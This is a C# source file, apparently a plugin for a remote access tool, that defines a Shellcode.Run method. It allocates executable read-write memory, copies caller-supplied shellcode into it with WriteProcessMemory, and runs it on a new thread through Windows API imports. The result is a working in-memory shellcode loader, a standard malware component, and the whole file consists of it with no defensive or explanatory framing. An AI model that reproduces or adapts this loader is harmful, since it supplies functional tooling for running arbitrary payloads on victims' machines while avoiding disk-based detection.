using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace Miscellaneous.Handler
{
    class Shellcode
    {
        public static void Run(byte[] shellcode, bool fork)
        {
            if (shellcode.Length == 0)
                throw new Exception("Shellcode is empty!");

            IntPtr pMem = VirtualAlloc(UIntPtr.Zero, shellcode.Length,
                AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

            if (pMem == IntPtr.Zero || Marshal.GetLastWin32Error() != 0)
                throw new Exception("Unable to allocate memory region.");

            try
            {
                //Marshal.Copy(shellcode, 0, pMem, shellcode.Length);
                IntPtr dwBytes = IntPtr.Zero;
                WriteProcessMemory(GetCurrentProcess(), pMem, shellcode, shellcode.Length, out dwBytes);

                UInt32 dwThreadId = 0;
                UIntPtr hThread = CreateThread(UIntPtr.Zero, 0, pMem, IntPtr.Zero, 0, ref dwThreadId);

                if (hThread == UIntPtr.Zero)
                    throw new Exception("Unable to create thread for shellcode.");

                if (!fork)
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            finally
            {
                if (!fork)
                    VirtualFree(pMem, shellcode.Length, AllocationType.Release);
            }

        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, int dwSize,
            AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, int dwSize, AllocationType dwFreeType);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32")]
        private static extern UIntPtr CreateThread(UIntPtr lpThreadAttributes, UInt32 dwStackSize,
            IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(UIntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
    }
}
